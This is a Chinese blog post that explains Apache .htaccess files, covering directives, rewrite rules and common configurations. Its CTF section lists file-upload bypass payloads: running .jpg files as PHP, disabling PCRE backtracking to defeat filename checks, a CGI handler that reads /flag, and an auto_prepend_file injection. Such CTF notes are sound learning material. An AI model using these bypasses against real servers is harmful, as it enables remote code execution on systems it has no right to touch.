---
layout:     post
title:      htaccess-文件总结
subtitle:   服务器常见配置.htaccess
date:       2020-04-20
author:     BY Diego
header-img: img/wenzhang/post-bg-htaccess.jpg
catalog: true
tags:
    - apache
    - 配置
---


## 一、什么是 .htaccess 文件？
全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录，概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。

## 二、工作机制
Apache在所有上级的目录中查找.htaccess文件，以使所有有效的指令都起作用。所以，如果请求/www/htdocs/example中的页面，Apache必须查找以下文件：
/.htaccess

/www/.htaccess

/www/htdocs/.htaccess

/www/htdocs/example/.htaccess

总共要访问4个额外的文件，即使这些文件都不存在。
## 三、用途
通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档、防盗链等功能。

## 四、优缺点
* 优点：利用当前目录的.htaccess文件可以允许管理员灵活的随时按需改变目录访问策略。
* 缺点：Apache必须在所有上级的目录中查找.htaccess文件，对每一个请求都需要读取一次.htaccess文件,降低服务器性能，其次是安全。这样会允许用户自己修改服务器的配置，这可能会导致某些意想不到的修改。

## 五、基本语法

这里整理了一下 .htaccess中经常出现的指令即字符含义

### ①常用指令

指令|功能| 示例
-|-|-
AddType | 添加类型 |AddType application/x-httpd-php .php
RewriteEngine |用于开启或停用rewrite功能。|RewriteEngine On\|Off
RewriteBase | 用于设定重写的基准URL| RewriteBase /
RewriteCond |定义了一个规则的条件 | RewriteCond %{HTTP_HOST} ^(www\.)?xxx\.com$ // %{服务器变量名称} 常用变量可参考表三
RewriteRule |重写规则|RewriteRule /sss /ttt 将用户的/sss目录请求转到/ttt目录
ErrorDocument |设置错误页面| ErrorDocument 400 /error_pages/400.html
DirectoryIndex |设置文件夹首页| DirectoryIndex test.php
Redirect | 设置重定向| Redirect /old/  /new/  |

### ②RewriteCond语法中字符含义

字符 | 含义
-|-
\-d  |  视为一个路径名并测试它是否为一个存在的目录
\-f | 视为一个路径名并测试它是否为一个存在的常规文件
\-s  | 视为一个路径名并测试它是否为一个存在的、尺寸大于0的常规文件
\-l  |  视为一个路径名并测试它是否为一个存在的符号连接
\-x  |   视为一个路径名并测试它是否为一个存在的、具有可执行权限的文件。该权限由操作系统检测
\-F  |  是否为一个有效的文件，而且可以在服务器当前的访问控制配置下被访问
\-U  |  是否为一个有效的URL，而且可以在服务器当前的访问控制配置下被访问


### ③RewriteRule语法中部分字符含义

一般使用方法为 RewriteRule + 规则 + [字符]

字符|含义
-|-
E|设置环境变量
L  |  结尾规则
N  |   从头再来
NC  |  匹配忽略大小写
NE  |  在输出中不对URI进行转义
R  |  强制重定向
F  |  强制禁止URL

### ④常用的服务器和执行环境信息

参数名称|样例参考值|说明
-|-|-
HTTP_USER_AGENT  |- |当前请求头中 User-Agent: 项的内容，如果存在的话。
HTTP_REFERER  |http://www.test.cn/test.php  |引导用户代理到当前页的前一页的地址
HTTP_FORWARDED  |如果使用代理服务器的话会是代理服务器的IP地址, 本地不容易搭环境测试出值来.  |相当于PHP中的服务器参数: $_SERVER["HTTP_FORWARDED"]
HTTP_HOST  |www.test.com  |相当于PHP中的服务器参数: $_SERVER["HTTP_HOST"]
REQUEST_URI  |/test.html  |浏览器请求的资源信息.
REQUEST_FILENAME  |C:/webRoot/t/test.html  |被请求的资源的在磁盘的物理地址.
SERVER_ADDR  |127.0.0.1  |当前运行脚本所在的服务器的 IP 地址。
SERVER_PORT  |80  |Web 服务器使用的端口。
REMOTE_ADDR  |127.0.0.1 正在浏览当前页面用户的 IP 地址。  |浏览当前页面的用户的 IP 地址。
REMOTE_HOST  |127.0.0.1 正在浏览当前页面用户的主机名。反向域名解析基于该用户的 REMOTE_ADDR  |相当于PHP中的服务器参数: $_SERVER["REMOTE_HOST"]
REMOTE_PORT  |2356   |用户连接到服务器时所使用的端口
REQUEST_METHOD  |GET  | 请求方式
SCRIPT_FILENAME  |/var/www/html/index.php  |相当前执行脚本的绝对路径。
QUERY_STRING  |a=b&c=d&e=f  |query string（查询字符串），如果有的话，通过它进行页面访问。

更多值可以参考PHP手册的 **PHP Manual›预定义变量›服务器和执行环境信息** 即$_SERVER 部分


## 六、.htaccess 常见用法

### ①实现网站的重定向
```php
RewriteEngine On  #重写引擎开启
RewriteBase /   #设置重写基准目录为网站根目录 默认为http://www.xxx.com/这种形式
RewriteCond %{REQUEST_FILENAME} !-f #被请求的资源地址不是文件
RewriteCond %{REQUEST_FILENAME} !-d #被请求的资源地址不是目录
RewriteRule .  /index.php [L]  #满足上述两个条件，就将满足的请求跳转到index.php  ,[L] 为last最后一条
#-f -d含义参考表二
```
### ②文件防盗链

```php
RewriteEngine on
RewriteCond %{HTTP_REFERER} !^$ # 判断HTTP_REFERER不空
RewriteCond %{HTTP_REFERER} !^http://(www\.)?yourdomain.com/.*$ [NC] # 判断来源是否来自自己的域
RewriteRule \.(gif|jpg|png)$ http://****//error.png [R,L]
# 如果上面两个条件，将满足链接尾部为gif、jpg、png的定向到 http://****//error.png ，此处的R为redirect 意义为强制重定向 [NC]为忽略大小写
```

### ③限定IP地址访问
```php
order allow,deny
deny from 33.33.33.33 # 禁止指定IP 访问
deny from 12.12.12. # 禁止12.12.12.0/24 的地址访问
allow from all # 除禁止部分都可访问，不加都不能访问
```

### ④文件保护
```xml
<Files 文件名>
order allow,deny
deny from all
</Files>
```


### ⑤其他用法
```php
ErrorDocument 404 /templates/404.html #将错误页面定向到404.html

AddType application/x-httpd-php .test #将后缀为test的文件当做php脚本运行

DirectoryIndex test.php # 设置首页为test.php

Options All -Indexes  # 禁止目录浏览
Options All +Indexes  # 开放目录浏览
```

https://htaccess.iapolo.com/ 在线生成各种功能的htaccess文件


## 七、.htaccess 在CTF中的作用

最开始接触.htaccess文件就是在CTF中接触到的，而后用到的次数也逐渐增多。

最常用的就是文件上传.htaccess，绕过后缀限制（在.htaccess有执行权限时）

1、.htaccess文件内容为
```
 AddType application/x-httpd-php .jpg
```
 然后再上传后缀为jpg的一句话即可。

或者可以使用如下，将php转化成文本
```xml
<FilesMatch "\.ph.*$">
  SetHandler text/plain
</FilesMatch>
```

或者上传如下 然后访问server-status?refresh=5 来查看系统服务信息
```
SetHandler server-status
```

2. 如果检测后缀的正则表达式，且php同上为非nts，则可以上传.htaccess，内容如下
```
php_value pcre.backtrack_limit 0
php_value pcre.jit 0
```
演示代码
```php
<?php
$filename = "1.php";
if (preg_match("/\.php/",$filename)) {
	echo "true";
}else{
	echo "false";
}
?>
```
在不存在.htaccess时运行
[![1L9O54.png](https://s2.ax1x.com/2020/02/13/1L9O54.png)](https://imgchr.com/i/1L9O54)

存在时，且内容与上相符时
 ![1LCEPH.png](https://s2.ax1x.com/2020/02/13/1LCEPH.png)

pcre.backtrack_limit 与 pcre.jit的解释在PHP手册的**PHP Manual›php.ini 配置›php.ini 配置选项列表**
![1LCoJH.png](https://s2.ax1x.com/2020/02/13/1LCoJH.png)
目的是让正则的回溯设置为0，从而让匹配失效

也就是说第一步先上传.htaccess，然后再上传php文件。

3.apache加载了cgi_module 还可使用如下
```xml
Options +ExecCGI
AddHandler cgi-script .xx
```
1.xx
```bash
#! /bin/bash

echo Content-type: text/html

echo ""

cat /flag
```

4.绕过

\#  0x00 可以当注释  \ +换行 绕过关键字
htaccess 大小写不敏感

如下可绕过 exif_imagetype 检测
```
#define xlogo_width 1337
#define xlogo_height 1337
```


5、 可以使用如下语句
```php
php_value auto_prepend_file  ".htaccess"
# <?php phpinfo(); ?>
```
本地测试发现，会爆500错误
[![1qLd4P.md.png](https://s2.ax1x.com/2020/02/13/1qLd4P.md.png)](https://imgchr.com/i/1qLd4P)
phpstudy_pro中php版本 测试无一成功，用phpstudy2018版本中，仅非nts版本测试成功，
[![1qLhCV.png](https://s2.ax1x.com/2020/02/13/1qLhCV.png)](https://imgchr.com/i/1qLhCV) &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;[![1qLjC6.png](https://s2.ax1x.com/2020/02/13/1qLjC6.png)](https://imgchr.com/i/1qLjC6)

成功结果如下
[![1qXhXF.png](https://s2.ax1x.com/2020/02/13/1qXhXF.png)](https://imgchr.com/i/1qXhXF)

也就是说利用php_value时，存在失败的可能，原因通过日志来看
```
Invalid command 'php_value', perhaps misspelled or defined by a module not included in the server configuration
```
nts含义就不在这里说了。可能是PHP处理程序不同的原因，原因可以参考一下 https://forums.cpanel.net/threads/invalid-command-php_value-perhaps-mis-spelled-or-defined-by-a-module-not-included.184931/
[PHP处理程序](http://www.voidcn.com/article/p-qfxtodcn-btz.html)

.更多用法可以参考php手册的php.ini 配置选项列表
[![1LPtte.md.png](https://s2.ax1x.com/2020/02/13/1LPtte.md.png)](https://imgchr.com/i/1LPtte)

在这里说一下 这里的可修改范围
PHP_INI_USER    1    配置选项可在用户的 PHP 脚本或 Windows 注册表中设置
PHP_INI_PERDIR  2    配置选项可在 php.ini, .htaccess 或 httpd.conf 中设置
PHP_INI_SYSTEM    4    配置选项可在 php.ini or httpd.conf 中设置
PHP_INI_ALL    7    配置选项可在各处设置

一般寻找可利用点就从 PHP_INI_ALL、PHP_INI_PERDIR中查找

## 八、参考资料

[.htaccess 文件使用手册](https://c7sky.com/htaccess-guide.html)

[.htaccess详解及.htaccess参数说明](https://blog.csdn.net/cmzhuang/article/details/53537591)

[最完的htaccess文件用法收集整理](https://www.jb51.net/article/30445.htm)

[.htaccess rewrite 规则详细说明](https://www.jb51.net/article/82158.htm)

[.htaccess文件说明大全](https://htaccess.iapolo.com/htaccess-daquan.php)

[Apache中.htaccess文件功能](https://www.jb51.net/article/27304.htm)

[htaccess百度百科](https://baike.baidu.com/item/htaccess/1645473?fr=aladdin#2)

[php.ini配置选项可修改范围](http://blog.itpub.net/29753604/viewspace-1340416/)
